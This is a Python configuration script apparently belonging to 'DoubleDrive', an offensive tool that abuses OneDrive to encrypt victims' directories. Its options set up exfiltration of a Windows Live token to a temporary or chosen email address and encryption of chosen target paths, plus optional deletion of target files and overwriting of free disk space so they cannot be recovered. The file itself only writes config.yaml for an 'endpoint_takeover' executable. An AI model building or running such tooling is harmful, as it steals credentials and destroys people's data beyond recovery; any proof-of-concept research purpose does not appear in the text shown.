import yaml
import os
import argparse
import uuid

from config import ConfigKey
from doubledrive.endpoint_takeover_utils.temp_email import TempEmail

def parse_args():
    parser = argparse.ArgumentParser(description="Options setup for OneDrive DoubleDrive")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--temp-email", help="If specified, sets DoubleDrive to exfiltrate the windows live token over a temp email", action="store_true")
    group.add_argument("--custom-email", help="If specified, sets DoubleDrive to exfiltrate the windows live token over the specified email", type=str)

    parser.add_argument("--quick-delete", help="If specified, starts by deleting the target files instead of overwriting them. In the end of the process, the endpoint_takeover executable will start overwriting the free space on the disk in order to make sure files cannot be recovered", action="store_true")
    parser.add_argument("--onedrive-binaries-junction", help="If specified, set DoubleDrive to create a junction to the installation folder of OneDrive's latest version of the target", action="store_true")
    parser.add_argument("--target-paths", nargs="+", help="The list of directory paths to encrypt using OneDrive", type=str, required=True)

    return parser.parse_args()


def get_temp_email():
    temp_email = TempEmail()
    return f"{temp_email.username}@{temp_email.domain}"


def main():
    args = parse_args()
    email_addr = None
    if args.temp_email:
        email_addr = get_temp_email()
    else:
        email_addr = args.custom_email
    
    junction_names_to_target_paths = {}
    for target_path in args.target_paths:
        junction_names_to_target_paths[str(uuid.uuid4())] = target_path

    config = {
        ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value: email_addr,
        ConfigKey.IS_TEMP_EMAIL.value: args.temp_email,
        ConfigKey.TOKEN_FILE_NAME.value: str(uuid.uuid4()),
        ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value: junction_names_to_target_paths,
        ConfigKey.SHOULD_CREATE_ONEDRIVE_BINARIES_JUNCTION.value: args.onedrive_binaries_junction,
        ConfigKey.CMD_FILE_NAME.value: str(uuid.uuid4()),
        ConfigKey.QUICK_DELETE.value: args.quick_delete
    }
    if args.onedrive_binaries_junction:
        config[ConfigKey.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME.value] = str(uuid.uuid4())
        
    with open('config.yaml', 'w') as f:
        yaml.dump(config, f)



if "__main__" == __name__:
    main()